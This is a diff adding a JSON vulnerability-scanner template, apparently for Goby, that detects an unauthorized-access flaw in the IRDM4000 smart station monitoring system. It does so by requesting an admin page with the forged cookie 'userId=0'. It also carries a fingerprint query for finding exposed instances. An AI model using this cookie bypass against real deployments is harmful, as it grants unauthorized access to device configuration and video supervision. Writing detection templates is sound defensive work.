@@ -1,0 +1,69 @@
+{
+      "Name": "IRDM4000 Smart station Unauthorized access",
+      "Level": "2",
+      "Tags": [
+            "unauthorized access"
+      ],
+      "GobyQuery": "body=\"iRDM4000智慧站房在线监管\"",
+      "Description": "IRDM4000 Smart station",
+      "Product": "IRDM4000 Smart station",
+      "Homepage": "http://www.houtian-hb.com/",
+      "Author": "",
+      "Impact": "IRDM4000 unauthorized access vulnerability of userId=0",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/zfjg/index.html",
+                        "follow_redirect": true,
+                        "header": {
+                              "Cookie": "userId=0"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "设备配置",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "视频监管",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
